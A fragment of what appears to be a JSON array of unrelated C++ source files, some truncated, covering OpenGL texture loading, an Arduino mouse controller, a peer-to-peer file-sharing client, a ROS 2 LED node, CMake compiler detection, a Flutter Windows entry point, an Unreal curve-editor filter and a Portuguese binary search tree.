     switch (nrChannels) {\r\n        case(1): format = GL_RED; break;\r\n        case(3): format = GL_RGB; break;\r\n        case(4): format = GL_RGBA; break;\r\n        }\r\n        if (internalFormat == 0) {\r\n            internalFormat = format;\r\n        }\r\n        glTexImage2D(GL_TEXTURE_2D, 0, internalFormat, width, height, 0, format, GL_UNSIGNED_BYTE, data);\r\n        glGenerateMipmap(GL_TEXTURE_2D);\r\n    }\r\n    else {\r\n        std::cout << \"Failed to load texture: \" << filename << '\\n';\r\n    }\r\n\r\n    stbi_image_free(data);\r\n    return textureID;\r\n}\r\n\r\nglm::vec3 calcTangentForNormals(float vertices[24]) {\r\n    glm::vec3 pos1(vertices[0], vertices[1], vertices[2]);\r\n    glm::vec3 pos2(vertices[8], vertices[9], vertices[10]);\r\n    glm::vec3 pos3(vertices[16], vertices[17], vertices[18]);\r\n\r\n    glm::vec2 uv1(vertices[6], vertices[7]);\r\n    glm::vec2 uv2(vertices[14], vertices[15]);\r\n    glm::vec2 uv3(vertices[22], vertices[23]);\r\n\r\n    glm::vec3 edge1 = pos2 - pos1;\r\n    glm::vec3 edge2 = pos3 - pos1;\r\n    glm::vec2 deltaUV1 = uv2 - uv1;\r\n    glm::vec2 deltaUV2 = uv3 - uv1;\r\n\r\n    float det = (deltaUV1.x * deltaUV2.y - deltaUV2.x * deltaUV1.y);\r\n\r\n    float f = (det == 0.0f) ? 0.0f : 1.0f / det;\r\n\r\n    glm::vec3 tangent = f * (deltaUV2.y * edge1 - deltaUV1.y * edge2);\r\n\r\n    return glm::normalize(tangent);\r\n}\r\n\r\n\r\nint main() {\r\n    //init opengl\r\n    glfwInit();\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\r\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\r\n\r\n#ifdef __APPLE__\r\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\r\n#endif\r\n\r\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"Normal Map\", NULL, NULL);\r\n    if (window =",
    "/*\n * Copyright (c) 2015 Arduino LLC.  All right reserved.\n *\n * This library is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 2.1 of the License, or (at your option) any later version.\n *\n * This library is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n * See the GNU Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this library; if not, write to the Free Software\n * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n */\n\n#include <MouseController.h>\n\nextern \"C\" {\nvoid __mouseControllerEmptyCallback() { }\n}\n\nvoid mouseClicked()  __attribute__ ((weak, alias(\"__mouseControllerEmptyCallback\")));\nvoid mouseDragged()  __attribute__ ((weak, alias(\"__mouseControllerEmptyCallback\")));\nvoid mouseMoved()    __attribute__ ((weak, alias(\"__mouseControllerEmptyCallback\")));\nvoid mousePressed()  __attribute__ ((weak, alias(\"__mouseControllerEmptyCallback\")));\nvoid mouseReleased() __attribute__ ((weak, alias(\"__mouseControllerEmptyCallback\")));\n\nint MouseController::getXChange() {\n\tint r = dx;\n\tdx = 0;\n\treturn r;\n}\n\nint MouseController::getYChange() {\n\tint r = dy;\n\tdy = 0;\n\treturn r;\n}\n\nvoid MouseController::OnMouseMove(MOUSEINFO *mi) {\n\tdx += mi->dX;\n\tdy += mi->dY;\n\tif (buttons != 0)\n\t\tmouseDragged();\n\telse\n\t\tmouseMoved();\n}\n\nvoid MouseController::OnLeftButtonUp(MOUSEINFO * /* mi */) {\n\tbuttons &= ~LEFT_BUTTON;\n\tmouseReleased();\n\tmouseClicked();\n}\n\nvoid MouseController::OnLeftButtonDown(MOUSEINFO * /* mi */) {\n\tbuttons |= LEFT_BUTTON;\n\tmousePressed();\n}\n\nvoid MouseController::OnMiddleButtonUp(MOUSEINFO * /* mi */) {\n\tbuttons &= ~MIDDLE_BUTTON;\n\tmouseReleased();\n\tmouseClicked();\n}\n\nvoid MouseController::OnMiddleButtonDown(MOUSEINFO * /* mi */) {\n\tbuttons |= MIDDLE_BUTTON;\n\tmousePressed();\n}\n\nvoid MouseController::OnRightButtonUp(MOUSEINFO * /* mi */) {\n\tbuttons &= ~RIGHT_BUTTON;\n\tmouseReleased();\n\tmouseClicked();\n}\n\nvoid MouseController::OnRightButtonDown(MOUSEINFO * /* mi */) {\n\tbuttons |= RIGHT_BUTTON;\n\tmousePressed();\n}\n",
    "#include <bits/stdc++.h>\n#include <netdb.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <pthread.h>\n#include <regex>\n#include <iostream>\n#include <bits/stdc++.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <stdlib.h>\n#include <fstream>\n#include <sstream>\n#include <sys/stat.h>\n#include <cmath>\n#include <unistd.h>\n#include <sys/file.h>\n#include <fcntl.h>\nusing namespace std;\n#define MAX 10024\n#define SA struct sockaddr\n#define CHUNK 5 * 1024\n\nchar *c_port;\nchar *c_add;\n\nstruct file_details\n{\n    int file_size;\n    vector<int> bit_vector;\n    int number_of_chunks;\n    string path;\n};\n\nstruct client_details\n{\n    int sockfd;\n    string file_name;\n    string path;\n    string hash_of_file;\n    vector<string> hash_of_chunks;\n    int number_of_chunks;\n    vector<int> bit_vector;\n};\n\nvoid tokenize(std::string const &str, const char *delim, std::vector<std::string> &out)\n{\n    char *token = strtok(const_cast<char *>(str.c_str()), delim);\n    while (token != nullptr)\n    {\n        out.push_back(std::string(token));\n        token = strtok(nullptr, delim);\n    }\n}\n\nstring get_file_path(string command)\n{\n    char buff1[FILENAME_MAX];\n    string root = getcwd(buff1, FILENAME_MAX);\n    string temp;\n    if (command[0] == '~')\n    {\n        temp = string(root) + command.replace(0, 1, \"\");\n    }\n    else if (command[0] == '.' || command[0] == '/')\n    {\n        temp = string(root) + command.replace(0, 1, \"\");\n    }\n    else\n    {\n        temp = string(root) + \"/\" + command.replace(0, 0, \"\");\n    }\n    return temp;\n}\n\nint get_file_size(string file_name)\n{\n    ifstream in_file(file_name, ios::binary);\n    in_file.seekg(0, ios::end);\n    int file_size = in_file.tellg();\n    return file_size;\n}\n\nstring process_command(char buff[], map<string, file_details> &files)\n{\n    size_t len = strlen(buff);\n    if (len == 0)\n    {\n        return \"false\";\n    }\n    const char *delim = \" \";\n    vector<string> out;\n    string s = buff;\n    tokenize(s, delim, out);\n    if (out[0] == \"create_user\")\n    {\n        if (out.size() != 3)\n        {\n            cout << \"error: Enter username and password:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"login\")\n    {\n        if (out.size() != 3)\n        {\n            cout << \"error: Enter username and password:\\n\";\n            return \"false\";\n        }\n        return \"login\";\n    }\n    else if (out[0] == \"create_group\")\n    {\n        if (out.size() != 2)\n        {\n            cout << \"error: Enter group id:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"join_group\")\n    {\n        if (out.size() != 2)\n        {\n            cout << \"error: Enter group id:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"leave_group\")\n    {\n        if (out.size() != 2)\n        {\n            cout << \"error: Enter group id:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"list_requests\")\n    {\n        if (out.size() != 2)\n        {\n            cout << \"error: Enter group id:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"accept_request\")\n    {\n        if (out.size() != 3)\n        {\n            cout << \"error: Enter user_id and group id:\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"list_groups\")\n    {\n        return \"true\";\n    }\n    else if (out[0] == \"list_files\")\n    {\n        if (out.size() != 2)\n        {\n            cout << \"error: Enter group id \\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"upload_file\")\n    {\n        if (out.size() != 3)\n        {\n            cout << \"error: Enter group id and file name\\n\";\n            return \"false\";\n        }\n        char ch = '/';\n        size_t found;\n        found = out[1].find_last_of(ch);\n        if (found != string::npos)\n        {\n            out[1] = out[1].substr(found, out[1].length());\n        }\n        if (out[1][0] == '.')\n        {\n            out[1] = out[1].substr(1, out[1].length());\n        }\n        files[out[1]].file_size = get_file_size(out[1]);\n        files[out[1]].number_of_chunks = ceil(files[out[1]].file_size / CHUNK);\n        string path = get_file_path(out[1]);\n        files[out[1]].path = path;\n        vector<int> v(files[out[1]].number_of_chunks, 1);\n        files[out[1]].bit_vector = v;\n        return \"upload_file\";\n    }\n    else if (out[0] == \"download_file\")\n    {\n        if (out.size() != 4)\n        {\n            cout << \"error: Enter group id, file name and destination path\\n\";\n            return \"false\";\n        }\n        return \"true\";\n    }\n    else if (out[0] == \"logout\")\n    {\n        return \"true\";\n    }\n    else if (out[",
    "#include <chrono>\n#include <memory>\n#include <vector>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"my_interfaces/msg/led_state_array.hpp\"\n#include \"my_interfaces/srv/set_led.hpp\"\n\nusing namespace std::chrono_literals;\n\nclass LedPanelNode : public rclcpp::Node\n{\npublic:\n    LedPanelNode()\n    : Node(\"led_panel\")\n    {\n        led_states_ = {0, 0, 0};\n        led_states_publisher_ = this->create_publisher<my_interfaces::msg::LedStateArray>(\"led_states\", 10);\n        led_states_timer_ = this->create_wall_timer(4s, std::bind(&LedPanelNode::publish_led_states, this));\n        set_led_service_ = this->create_service<my_interfaces::srv::SetLed>(\n            \"set_led\",\n            std::bind(&LedPanelNode::callback_set_led, this, std::placeholders::_1, std::placeholders::_2)\n        );\n        RCLCPP_INFO(this->get_logger(), \"Led panel node has been started.\");\n    }\n\nprivate:\n    void publish_led_states()\n    {\n        auto msg = my_interfaces::msg::LedStateArray();\n        msg.led_states = led_states_;\n        led_states_publisher_->publish(msg);\n    }\n\n    void callback_set_led(\n        const std::shared_ptr<my_interfaces::srv::SetLed::Request> request,\n        std::shared_ptr<my_interfaces::srv::SetLed::Response> response)\n    {\n        int64_t led_num = request->led_number;\n        int64_t state = request->state;\n\n        if (led_num > static_cast<int64_t>(led_states_.size()) || led_num <= 0)\n        {\n            response->success = false;\n            return;\n        }\n\n        if (state != 0 && state != 1)\n        {\n            response->success = false;\n            return;\n        }\n\n        led_states_[led_num - 1] = state;\n        response->success = true;\n        publish_led_states();\n    }\n\n    std::vector<int64_t> led_states_;\n    rclcpp::Publisher<my_interfaces::msg::LedStateArray>::SharedPtr led_states_publisher_;\n    rclcpp::TimerBase::SharedPtr led_states_timer_;\n    rclcpp::Service<my_interfaces::srv::SetLed>::SharedPtr set_led_service_;\n};\n\nint main(int argc, char **argv)\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<LedPanelNode>();\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"river_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"CurveEditorAlignToLastKeyFilter.h\"\n\n#include \"Containers/Array.h\"\n#include \"Containers/ArrayView.h\"\n#include \"CurveDataAbstraction.h\"\n#include \"CurveEditor.h\"\n#include \"CurveEditorSelection.h\"\n#include \"CurveEditorSnapMetrics.h\"\n#include \"CurveEditorTypes.h\"\n#include \"CurveModel.h\"\n#include \"Curves/KeyHandle.h\"\n#include \"Curves/RealCurve.h\"\n#include \"HAL/PlatformCrt.h\"\n#include \"Math/NumericLimits.h\"\n#include \"Math/UnrealMathSSE.h\"\n#include \"Misc/FrameRate.h\"\n#include \"Misc/Optional.h\"\n#include \"Templates/Tuple.h\"\n#include \"Templates/UnrealTemplate.h\"\n\nvoid UCurveEditorAlignToLastKeyFilter::InitializeFilter_Impl(TSharedRef<FCurveEditor> InCurveEditor)\n{\n\tif (!InCurveEditor->GetTimeSliderController())\n\t{\n\t\treturn;\n\t}\n\n\t/*\n\t// There is a valid time slider controller, so we can use the display rate and tick resolution from it to define frames\n\tbUseSeconds = false;\n\n\t// Initialize Bake Interval and Custom Ranges if they haven't been initialized with these parameters\n\tconst FFrameRate DisplayRate = InCurveEditor->GetTimeSliderController()->GetDisplayRate();\n\tconst FFrameRate TickResolution = InCurveEditor->GetTimeSliderController()->GetTickResolution();\n\n\tif (DisplayRate == InitialDisplayRate && TickResolution == InitialTickResolution)\n\t{\n\t\treturn;\n\t}\n\n\tInitialDisplayRate = DisplayRate;\n\tInitialTickResolution = TickResolution;\n\n\tTRange<FFrameNumber> PlayRange = InCurveEditor->GetTimeSliderController()->GetPlayRange();\n\n\tBakeInterval = FFrameRate::TransformTime(FFrameTime(1), DisplayRate, TickResolution).FrameNumber;\n\tCustomRange.Min = PlayRange.GetLowerBoundValue();\n\tCustomRange.Max = PlayRange.GetUpperBoundValue();\n\t*/\n}\n\nbool UCurveEditorAlignToLastKeyFilter::CanApplyFilter_Impl(TSharedRef<FCurveEditor> InCurveEditor)\n{\n\t//return bCustomRangeOverride || \n\treturn InCurveEditor->GetSelection().Count() > 0;\n}\n\nvoid UCurveEditorAlignToLastKeyFilter::ApplyFilter_Impl(TSharedRef<FCurveEditor> InCurveEditor, const TMap<FCurveModelID, FKeyHandleSet>& InKeysToOperateOn, TMap<FCurveModelID, FKeyHandleSet>& OutKeysToSelect)\n{\n\tTArray<FKeyHandle> KeyHandles;\n\tTArray<FKeyHandle> KeyHandlesToModify;\n\tTArray<FKeyPosition> SelectedKeyPositions;\n\n\tTArray<FKeyPosition> NewKeyPositions;\n\n\tint totalKeys = 0;\n\n\tfor (const TTuple<FCurveModelID, FKeyHandleSet>& Pair : InKeysToOperateOn)\n\t{\n\t\ttotalKeys += Pair.Value.Num();\n\t}\n\n\n\tUE_LOG(LogTemp, Warning, TEXT(\"Testing!\"));\n\tUE_LOG(LogTemp, Warning, TEXT(\"Num curves: %d, num keys total: %d\"), InKeysToOperateOn.Num(), totalKeys);\n\n\n\t\n\tfor (const TTuple<FCurveModelID, FKeyHandleSet>& Pair : InKeysToOperateOn)\n\t{\n\t\t// first check if curve exists\n\t\tFCurveModel* Curve = InCurveEditor->FindCurve(Pair.Key);\n\t\tif (!Curve)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\t/*// then check if curve is for rotation value\n\t\tif (!Curve->GetIntentionName().Contains(\"Rotation\"))\n\t\t{\n\t\t\tcontinue;\n\t\t}*/\n\n\t\tKeyHandles.Reset(Pair.Value.Num());\n\t\tKeyHandles.Append(Pair.Value.AsArray().GetData(), Pair.Value.Num());\n\n\t\t// Get all the selected keys\n\t\tSelectedKeyPositions.SetNum(KeyHandles.Num());\n\t\tCurve->GetKeyPositions(KeyHandles, SelectedKeyPositions);\n\n\t\t// Find the hull of the range of the selected keys\n\t\tdouble MinKey = TNumericLimits<double>::Max(), MaxKey = TNumericLimits<double>::Lowest();\n\t\tfor (FKeyPosition Key : SelectedKeyPositions)\n\t\t{\n\t\t\tMinKey = FMath::Min(Key.InputValue, MinKey);\n\t\t\tMaxKey = FMath::Max(Key.InputValue, MaxKey);\n\t\t}\n\n\t\t// Get all keys that exist between the time range\n\t\tKeyHandles.Reset();\n\t\tCurve->GetKeys(*InCurveEditor, MinKey, MaxKey, TNumericLimits<double>::Lowest(), TNumericLimits<double>::Max(), KeyHandles);\n\n\t\tif ((/*!bUseSlope &&*/ (KeyHandles.Num() >= 2)) || (KeyHandles.Num() > 2))\n\t\t{\n\t\t\t// get the selected key positions\n\t\t\tSelectedKeyPositions.SetNum(KeyHandles.Num());\n\t\t\tCurve->GetKeyPositions(KeyHandles, SelectedKeyPositions);\n\n\n\t\t\tint lastKeyIndex = 0;\n\t\t\tint secondOutIndex = 1;\n\t\t\tint thirdOutIndex = 2;\n\n\t\t\t\n\t\t\tif (bAlignToFirst) \n\t\t\t{\n\t\t\t\t// everything's done already\n\t\t\t}\n\t\t\telse {\n\t\t\t\tlastKeyIndex = KeyHandles.Num() - 1;\n\t\t\t\tsecondOutIndex = lastKeyIndex - 1;\n\t\t\t\tthirdOutIndex = lastKeyIndex - 2;\n\t\t\t}\n\n\n\t\t\t/*float LastKeyVal = SelectedKeyPositions[KeyHandles.Num() - 1].OutputValue;\n\t\t\tfloat SecondToLastKeyVal = SelectedKeyPositions[KeyHandles.Num() - 2].OutputValue;*/\n\t\t\tfloat LastKeyVal = SelectedKeyPositions[lastKeyIndex].OutputValue;\n\t\t\tfloat SecondToLastKeyVal = SelectedKeyPositions[secondOutIndex].OutputValue;\n\n\n\t\t\tfloat diffToAdd = LastKeyVal - SecondToLastKeyVal;\n\n\t\t\tUE_LOG(LogTemp, Warning, TEXT(\"Curves[%s]: secondToLast( %f ), last( %f )\"), *(Curve->GetIntentionName()), SecondToLastKeyVal, LastKeyVal);\n\n\t\t\t// reset the old calculated key positions\n\t\t\tNewKeyPositions.Reset();\n\t\t\tKeyHandlesToModify.Reset();\n\n\t\t\tfor (int32 KeyIndex = 0; KeyIndex <= KeyHandles.Num() - 1; KeyIndex++)\n\t\t\t{\n\t\t\t\tif (KeyIndex != lastKeyIndex) {\n\t\t\t\t\tSelectedKeyPositions[KeyIndex].OutputValue += diffToAdd;\n\t\t\t\t}\n\n\t",
    "\r\n#include <iostream>\r\n#include <queue>  // Biblioteca necess\u00e1ria para a nova fun\u00e7\u00e3o\r\n#include <stdlib.h>\r\n#include \"ArvoreBinariaBusca.h\"\r\n\r\nusing namespace std;\r\n\r\nTipoCelula *Raiz;\r\nint Contador;\r\n\r\nvoid ArvoreBinariaBusca_Construtor() {\r\n    Raiz = NULL;\r\n    Contador = 0;\r\n}\r\n\r\nvoid ArvoreBinariaBusca_Destrutor() {\r\n    ArvoreBinariaBusca_Destrutor(Raiz);\r\n    Contador = 0;\r\n}\r\n\r\nvoid ArvoreBinariaBusca_Destrutor(TipoCelula *&Raiz) {\r\n    if (Raiz != NULL) {\r\n        ArvoreBinariaBusca_Destrutor(Raiz->Esq);\r\n        ArvoreBinariaBusca_Destrutor(Raiz->Dir);\r\n        delete Raiz;\r\n        Raiz = NULL;\r\n    }\r\n}\r\n\r\nbool ArvoreBinariaBusca_Vazia() {\r\n    return Raiz == NULL;\r\n}\r\n\r\nint ArvoreBinariaBusca_Tamanho() {\r\n    return Contador;\r\n}\r\n\r\nbool ArvoreBinariaBusca_Inserir(TipoDado Elemento) {\r\n    return ArvoreBinariaBusca_Inserir(Elemento, Raiz);\r\n}\r\n\r\nbool ArvoreBinariaBusca_Inserir(TipoDado Elemento, TipoCelula *&Raiz) {\r\n    if (Raiz == NULL) {\r\n        if ((Raiz = new TipoCelula) == NULL)\r\n            return false;\r\n        Raiz->Item = Elemento;\r\n        Raiz->Esq = Raiz->Dir = NULL;\r\n        Contador++;\r\n        return true;\r\n    } else if (Elemento < Raiz->Item) {\r\n        return ArvoreBinariaBusca_Inserir(Elemento, Raiz->Esq);\r\n    } else if (Elemento > Raiz->Item) {\r\n        return ArvoreBinariaBusca_Inserir(Elemento, Raiz->Dir);\r\n    }\r\n    return false;\r\n}\r\n\r\nbool ArvoreBinariaBusca_Pesquisar(TipoDado Elemento) {\r\n    return ArvoreBinariaBusca_Pesquisar(Elemento, Raiz);\r\n}\r\n\r\nbool ArvoreBinariaBusca_Pesquisar(TipoDado Elemento, TipoCelula *Raiz) {\r\n    if (Raiz == NULL) return false;\r\n    if (Elemento < Raiz->Item) {\r\n        return ArvoreBinariaBusca_Pesquisar(Elemento, Raiz->Esq);\r\n    } else if (Elemento > Raiz->Item) {\r\n        return ArvoreBinariaBusca_Pesquisar(Elemento, Raiz->Dir);\r\n    }\r\n    return true;\r\n}\r\n\r\nvoid ArvoreBinariaBusca_Percurso(int modo) {\r\n    switch (modo) {\r\n        case 1: ArvoreBinariaBusca_PreOrdem(Raiz); break;\r\n        case 2: ArvoreBinariaBusca_EmOrdem(Raiz); break;\r\n        case 3: ArvoreBinariaBusca_PosOrdem(Raiz); break;\r\n        default: cout << \"Ordem desconhecida\"; break;\r\n    }\r\n    cout << endl << endl;\r\n    system(\"pause\");\r\n}\r\n\r\nvoid ArvoreBinariaBusca_EmOrdem(TipoCelula *Raiz) {\r\n    if (Raiz != NULL) {\r\n        ArvoreBinariaBusca_EmOrdem(Raiz->Esq);\r\n        cout << Raiz->Item << \" \";\r\n        ArvoreBinariaBusca_EmOrdem(Raiz->Dir);\r\n    }\r\n}\r\n\r\nvoid ArvoreBinariaBusca_PreOrdem(TipoCelula *Raiz) {\r\n    if (Raiz != NULL) {\r\n        cout << Raiz->Item << \" \";\r\n        ArvoreBinariaBusca_PreOrdem(Raiz->Esq);\r\n        ArvoreBinariaBusca_PreOrdem(Raiz->Dir);\r\n    }\r\n}\r\n\r\nvoid ArvoreBinariaBusca_PosOrdem(TipoCelula *Raiz) {\r\n    if (Raiz != NULL) {\r\n        ArvoreBinariaBusca_PosOrdem(Raiz->Esq);\r\n        ArvoreBinariaBusca_PosOrdem(Raiz->Dir);\r\n        cout << Raiz->Item << \" \";\r\n    }\r\n}\r\n\r\n// Nova fun\u00e7\u00e3o: Imprimir todos os nodos de um dado n\u00edvel\r\nvoid ArvoreBinariaBusca_Imprimir_Por_Nivel(int nivel) {\r\n    if (Raiz == NULL) {\r\n        cout << \"Arvore vazia.\" << endl;\r\n        return;\r\n    }\r\n\r\n    queue<TipoCelula*> fila;\r\n    queue<int> niveis;\r\n\r\n    fila.push(Raiz);\r\n    niveis.push(0);\r\n\r\n    bool encontrou = false;\r\n\r\n    while (!fila.empty()) {\r\n        TipoCelula* atual = fila.front();\r\n        int nivelAtual = 